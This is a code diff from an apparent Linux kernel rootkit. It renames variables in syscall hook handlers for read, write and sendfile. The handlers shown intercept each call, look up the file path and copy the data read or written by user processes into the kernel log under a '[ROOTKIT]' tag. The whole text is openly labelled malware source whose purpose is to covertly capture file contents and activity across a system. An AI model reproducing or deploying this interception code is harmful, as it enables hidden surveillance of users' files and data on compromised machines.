@@ -13,13 +13,13 @@
 static long do_read_hook(sysfun_t orig_func, struct pt_regs *p_regs, unsigned int ui32_fd,
                          char __user *s_buf, size_t sz_count, loff_t i64_pos)
 {
-    long l_err             = 0;    // Error code of the copy functions
-    long l_ret             = 0;    // Return value of the real syscall
+    long i64_err           = 0;    // Error code of the copy functions
+    long i64_ret           = 0;    // Return value of the real syscall
     char *s_data           = NULL; // Data read from the user
     const char *s_pathname = NULL; // Pathname of the file
 
-    l_ret = orig_func(p_regs);
-    pr_cont(" = %ld\n", l_ret);
+    i64_ret = orig_func(p_regs);
+    pr_cont(" = %ld\n", i64_ret);
 
     s_pathname = fd_get_pathname(ui32_fd);
     IF_U (IS_ERR_OR_NULL(s_pathname)) {
@@ -28,49 +28,49 @@ static long do_read_hook(sysfun_t orig_func, struct pt_regs *p_regs, unsigned in
     pr_info("[ROOTKIT] * File name: %s\n", s_pathname);
     kfree_const(s_pathname);
 
-    IF_U (l_ret <= 0) {
+    IF_U (i64_ret <= 0) {
         // No data read or error, return immediately
-        IF_L (l_ret == 0) {
+        IF_L (i64_ret == 0) {
             pr_info("[ROOTKIT] * No data read\n");
         }
         else {
-            pr_err("[ROOTKIT] * Error: %ld\n", l_ret);
+            pr_err("[ROOTKIT] * Error: %ld\n", i64_ret);
         }
-        return l_ret;
+        return i64_ret;
     }
 
-    s_data = (char *)kvmalloc(l_ret + 1, GFP_KERNEL);
+    s_data = (char *)kvmalloc(i64_ret + 1, GFP_KERNEL);
 
     IF_U (s_data == NULL) {
         pr_err("[ROOTKIT] * Could not allocate memory\n");
     }
     else {
-        l_err = strncpy_from_user(s_data, s_buf, l_ret);
+        i64_err = strncpy_from_user(s_data, s_buf, i64_ret);
 
-        IF_U (l_err < 0) {
+        IF_U (i64_err < 0) {
             pr_err("[ROOTKIT] * Could not copy data from user\n");
         }
         else {
-            s_data[l_ret] = '\0';
+            s_data[i64_ret] = '\0';
             pr_info("[ROOTKIT] * Data read: %s\n", s_data);
         }
 
         kvfree(s_data);
     }
 
-    return l_ret;
+    return i64_ret;
 }
 
 static long do_write_hook(sysfun_t orig_func, struct pt_regs *p_regs, unsigned int ui32_fd,
                           const char __user *s_buf, size_t sz_count, loff_t i64_pos)
 {
-    long l_err             = 0;    // Error code of the copy functions
-    long l_ret             = 0;    // Return value of the real syscall
+    long i64_err           = 0;    // Error code of the copy functions
+    long i64_ret           = 0;    // Return value of the real syscall
     char *s_data           = NULL; // Data written to the user
     const char *s_pathname = NULL; // Pathname of the file
 
-    l_ret = orig_func(p_regs);
-    pr_cont(" = %ld\n", l_ret);
+    i64_ret = orig_func(p_regs);
+    pr_cont(" = %ld\n", i64_ret);
 
     s_pathname = fd_get_pathname(ui32_fd);
     IF_U (IS_ERR_OR_NULL(s_pathname)) {
@@ -79,37 +79,37 @@ static long do_write_hook(sysfun_t orig_func, struct pt_regs *p_regs, unsigned i
     pr_info("[ROOTKIT] * File name: %s\n", s_pathname);
     kfree_const(s_pathname);
 
-    IF_U (l_ret <= 0) {
+    IF_U (i64_ret <= 0) {
         // No data written or error, return immediately
-        IF_L (l_ret == 0) {
+        IF_L (i64_ret == 0) {
             pr_info("[ROOTKIT] * No data written\n");
         }
         else {
-            pr_err("[ROOTKIT] * Error: %ld\n", l_ret);
+            pr_err("[ROOTKIT] * Error: %ld\n", i64_ret);
         }
-        return l_ret;
+        return i64_ret;
     }
 
-    s_data = (char *)kvmalloc(l_ret + 1, GFP_KERNEL);
+    s_data = (char *)kvmalloc(i64_ret + 1, GFP_KERNEL);
 
     IF_U (s_data == NULL) {
         pr_err("[ROOTKIT] * Could not allocate memory\n");
     }
     else {
-        l_err = strncpy_from_user(s_data, s_buf, l_ret);
+        i64_err = strncpy_from_user(s_data, s_buf, i64_ret);
 
-        IF_U (l_err < 0) {
+        IF_U (i64_err < 0) {
             pr_err("[ROOTKIT] * Could not copy data from user\n");
         }
         else {
-            s_data[l_ret] = '\0';
+            s_data[i64_ret] = '\0';
             pr_info("[ROOTKIT] * Data to write: %s\n", s_data);
         }
 
         kvfree(s_data);
     }
 
-    return l_ret;
+    return i64_ret;
 }
 
 // sys_read syscall hook handler
@@ -143,14 +143,14 @@ SYSCALL_HOOK_HANDLER3(write, orig_write, p_regs, unsigned int, ui32_fd, const ch
 SYSCALL_HOOK_HANDLER4(sendfile, orig_sendfile, p_regs, int, i32_out_fd, int, i32_in_fd,
                       loff_t __user *, p_offset, size_t, sz_count)
 {
-    long l_ret                 = 0;    // Return value of the real syscall
+    long i64_ret               = 0;    // Return value of the real syscall
     const char *s_pathname_in  = NULL; // Pathname of the input file
     const char *s_pathname_out = NULL; // Pathname of the output file
 
     pr_info("[ROOTKIT] sendfile(%d, %d, %p, %zu)", i32_out_fd, i32_in_fd, p_offset, sz_count);
 
-    l_ret = orig_sendfile(p_regs);
-    pr_cont(" = %ld\n", l_ret);
+    i64_ret = orig_sendfile(p_regs);
+    pr_cont(" = %ld\n", i64_ret);
 
     s_pathname_in  = fd_get_pathname(i32_in_fd);
     s_pathname_out = fd_get_pathname(i32_out_fd);
@@ -163,5 +163,5 @@ SYSCALL_HOOK_HANDLER4(sendfile, orig_sendfile, p_regs, int, i32_out_fd, int, i32
     pr_info("[ROOTKIT] *  In file name: %s\n", s_pathname_in);
     pr_info("[ROOTKIT] * Out file name: %s\n", s_pathname_out);
 
-    return l_ret;
+    return i64_ret;
 }
